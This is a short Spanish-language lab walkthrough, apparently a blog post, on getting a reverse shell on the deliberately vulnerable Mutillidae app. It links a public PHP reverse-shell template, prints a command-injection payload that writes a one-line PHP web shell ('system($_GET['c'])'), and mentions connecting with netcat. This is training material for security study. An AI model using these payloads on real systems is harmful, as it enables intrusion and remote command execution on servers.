---
typora-copy-images-to: ../../myassets/img/file_upload/
typora-root-url: ../../
layout: post

---

En la siguiente vamos a llevar a cabo un reverse shell mediante la subida de un archivo ejecutable.

Para ello nos vamos a descargar una plantilla de [esta dirección](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) y la gurardaremos como shell.php

Lo editamos y cambiamos la dirección IP por la que tenemos en el equipo.

![5](/PePs/myassets/img/file_upload/5.png)

Y la subimos a la página, en este caso lo vamos a subir a Mutillidae usando el siguiente comando:

```php
127.0.0.1;echo "<?php system(\$_GET['c']); ?>" > shell.php


```

Si realizamos un listado, podemos ver como se ha subido correctamente

![50](/PePs/myassets/img/file_upload/50.PNG)



![51](/PePs/myassets/img/file_upload/51.PNG)



En un terminal ejecutamos el comando netcat para conectarnos a la máquina atacada.

![4](/PePs/myassets/img/file_upload/4.png)